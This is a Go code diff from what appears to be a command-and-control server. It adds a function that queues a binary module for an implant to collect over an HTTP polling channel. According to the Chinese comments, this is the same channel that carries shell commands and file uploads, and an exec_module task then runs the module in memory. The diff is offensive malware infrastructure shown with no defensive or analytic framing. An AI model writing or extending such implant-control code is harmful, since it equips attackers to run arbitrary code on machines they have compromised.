@@ -973,3 +973,28 @@ func (l *HTTPListener) handleFilePullHTTP(w http.ResponseWriter, r *http.Request
 	w.Header().Set("Content-Type", "application/octet-stream")
 	w.Write(encrypted)
 }
+
+// ─── 内存模块二进制下发（v1.4.0 S4）───────────────────────────────────────────
+
+// PushModuleBlob 把模块二进制放进会话的下行队列（HTTP 轮询通道）。
+//
+// HTTP 通道服务端无法主动推送，只能排队等植入端下次心跳取走 —— 与 shell 指令/
+// 文件上传指令完全同一条路径（queueDown/popDown）。植入端在一次心跳响应里
+// **先处理 down 帧、再处理 tasks**，所以 exec_module 任务执行时二进制已经暂存好了。
+func (l *HTTPListener) PushModuleBlob(sessionID, token string, payload []byte) error {
+	if len(payload) == 0 {
+		return fmt.Errorf("empty module blob")
+	}
+	packet := &protocol.Packet{
+		Magic:     [4]byte{'T', 'S', 'H', 'L'},
+		Version:   protocol.Version,
+		Type:      protocol.TypeModuleData,
+		Timestamp: uint64(time.Now().UnixMilli()),
+		Payload:   payload,
+	}
+	if err := l.queueDown(sessionID, packet); err != nil {
+		return fmt.Errorf("failed to queue module blob: %w", err)
+	}
+	logging.Info("listener", "module blob queued for session %s (token=%s size=%d)", sessionID, shortToken(token), len(payload))
+	return nil
+}
